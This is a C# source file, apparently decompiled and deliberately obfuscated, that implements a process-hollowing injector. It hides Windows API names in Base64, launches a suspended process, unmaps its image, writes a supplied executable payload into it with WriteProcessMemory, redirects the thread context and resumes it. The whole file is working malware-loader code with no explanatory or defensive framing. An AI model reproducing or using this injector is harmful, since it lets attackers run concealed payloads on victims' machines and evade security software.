using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class lnrosxxr
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool lnrosxxresclbnzeb(string ietrditgqlkybeccz, StringBuilder gisswaffbyrczcjbek, IntPtr tddvzyuanpptiley, IntPtr ycqlhnopsrfcrqntkq, [MarshalAs(UnmanagedType.Bool)] bool eaujxngrghxreezr, int jagdrflhlgcppngkw, IntPtr qftzyqcyyhqalvcldis, string bvdqwpklthusqazhws, byte[] fjplrhicndhdizglrwr, IntPtr[] poegrpgaokukwhbc);

	public delegate bool eilqikeyqjujvfvkjnrd(IntPtr hiknaiiqyqcrskcd, IntPtr dvjxepuaeohgthdhpei, byte[] rayhtovktvtpnqsprofv, uint gobjshapdwhffjwrqj, int sfztruhrredwfadfexn);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool uhvycpyqufrlfzhglja(IntPtr hpjvxhftkugsddeoaxrv, IntPtr iesuuhchynegvvzlqz, ref IntPtr aanqiibdlcdgsyaiuthg, int kgvischhvgphidni, ref IntPtr tnieryiajydgnfah);

	public delegate IntPtr jxrvsgicziznszcjx(IntPtr ptxvzenhfiyxjrukuiaa, IntPtr gwsrduhhhelsotxpp, IntPtr wscnyxncgrtvlwsjy, int oykcpqvtqoonaicn, int bsgijtjjdskoknjpk);

	public delegate uint soiyyrevooirbokub(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

	public delegate uint sqiuwbybitiopbystw(IntPtr lcelxaicxuenriantqju);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool vwqyfungepvutuatxbzi(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool nxxbhqnoostjpwpsz(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string maTZ);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr bCSDWX, [MarshalAs(UnmanagedType.VBByRefStr)] ref string wBlSPCW);

	public static T xuenvoeckpvidziiu<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(T));
	}

	public static bool eVfWWuJliMVejWRgTI(byte[] xsuiqqwrqeniwbwnz, string pgatylcppynhtbqgvu)
	{
		lnrosxxresclbnzeb lnrosxxresclbnzeb = xuenvoeckpvidziiu<lnrosxxresclbnzeb>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
		vwqyfungepvutuatxbzi vwqyfungepvutuatxbzi = xuenvoeckpvidziiu<vwqyfungepvutuatxbzi>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
		uhvycpyqufrlfzhglja uhvycpyqufrlfzhglja = xuenvoeckpvidziiu<uhvycpyqufrlfzhglja>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
		jxrvsgicziznszcjx jxrvsgicziznszcjx = xuenvoeckpvidziiu<jxrvsgicziznszcjx>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
		eilqikeyqjujvfvkjnrd eilqikeyqjujvfvkjnrd = xuenvoeckpvidziiu<eilqikeyqjujvfvkjnrd>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
		nxxbhqnoostjpwpsz nxxbhqnoostjpwpsz = xuenvoeckpvidziiu<nxxbhqnoostjpwpsz>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
		sqiuwbybitiopbystw sqiuwbybitiopbystw = xuenvoeckpvidziiu<sqiuwbybitiopbystw>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
		soiyyrevooirbokub soiyyrevooirbokub = xuenvoeckpvidziiu<soiyyrevooirbokub>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] fjplrhicndhdizglrwr = new byte[68];
				int num = BitConverter.ToInt32(xsuiqqwrqeniwbwnz, 60);
				int num2 = BitConverter.ToInt16(xsuiqqwrqeniwbwnz, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, num + 84));
				if (lnrosxxresclbnzeb(null, new StringBuilder(pgatylcppynhtbqgvu), zero, zero, eaujxngrghxreezr: false, 4, zero, null, fjplrhicndhdizglrwr, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (vwqyfungepvutuatxbzi(array[1], array2))
					{
						IntPtr iesuuhchynegvvzlqz = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr aanqiibdlcdgsyaiuthg = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr tnieryiajydgnfah = IntPtr.Zero;
						if (uhvycpyqufrlfzhglja(array[0], iesuuhchynegvvzlqz, ref aanqiibdlcdgsyaiuthg, (int)intPtr2, ref tnieryiajydgnfah) && unchecked((long)soiyyrevooirbokub(array[0], aanqiibdlcdgsyaiuthg)) == 0L)
						{
							IntPtr dvjxepuaeohgthdhpei = jxrvsgicziznszcjx(gwsrduhhhelsotxpp: new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, num + 52)), wscnyxncgrtvlwsjy: new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, num + 80)), ptxvzenhfiyxjrukuiaa: array[0], oykcpqvtqoonaicn: 12288, bsgijtjjdskoknjpk: 64);
							int num3 = dvjxepuaeohgthdhpei.ToInt32();
							int sfztruhrredwfadfexn = default(int);
							eilqikeyqjujvfvkjnrd(array[0], dvjxepuaeohgthdhpei, xsuiqqwrqeniwbwnz, (uint)(int)intPtr, sfztruhrredwfadfexn);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(xsuiqqwrqeniwbwnz, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(xsuiqqwrqeniwbwnz, array3[5], array4, 0, array4.Length);
								eilqikeyqjujvfvkjnrd(dvjxepuaeohgthdhpei: new IntPtr(num3 + array3[3]), gobjshapdwhffjwrqj: (uint)(int)new IntPtr(array4.Length), hiknaiiqyqcrskcd: array[0], rayhtovktvtpnqsprofv: array4, sfztruhrredwfadfexn: sfztruhrredwfadfexn);
							}
							eilqikeyqjujvfvkjnrd(dvjxepuaeohgthdhpei: new IntPtr(unchecked((long)array2[41]) + 8L), gobjshapdwhffjwrqj: (uint)(int)new IntPtr(4), hiknaiiqyqcrskcd: array[0], rayhtovktvtpnqsprofv: BitConverter.GetBytes(dvjxepuaeohgthdhpei.ToInt32()), sfztruhrredwfadfexn: sfztruhrredwfadfexn);
							array2[44] = (uint)(dvjxepuaeohgthdhpei.ToInt32() + BitConverter.ToInt32(xsuiqqwrqeniwbwnz, num + 40));
							nxxbhqnoostjpwpsz(array[1], array2);
						}
					}
					sqiuwbybitiopbystw(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
